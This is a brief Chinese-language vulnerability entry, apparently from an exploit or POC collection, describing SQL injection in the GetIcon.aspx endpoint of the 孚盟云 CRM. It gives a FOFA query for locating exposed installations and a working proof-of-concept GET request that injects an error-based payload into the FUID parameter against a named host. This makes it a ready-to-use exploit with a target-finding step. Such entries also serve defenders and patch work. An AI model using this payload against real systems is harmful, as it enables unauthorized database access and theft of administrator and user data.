## 孚盟云-GetIcon.aspx-sql注入漏洞

## 一、漏洞简介
孚盟云 GetIcon.aspx 接口存在SQL注入漏洞，攻击者除了可以利用 SQL 注入漏洞获取数据库中的信息（例如，管理员后台密码,站点的用户个人信息）之外，甚至在高权限的情况可向服务器中写入木马，进一步获取服务器系统权限。

## fofa
```
app="孚盟软件-孚盟云"
```

## POC
```
GET /Common/GetIcon.aspx?FUID=-1'and+1=@@VERSION-- HTTP/1.1
Host: fumacrm.mrxn.net
```
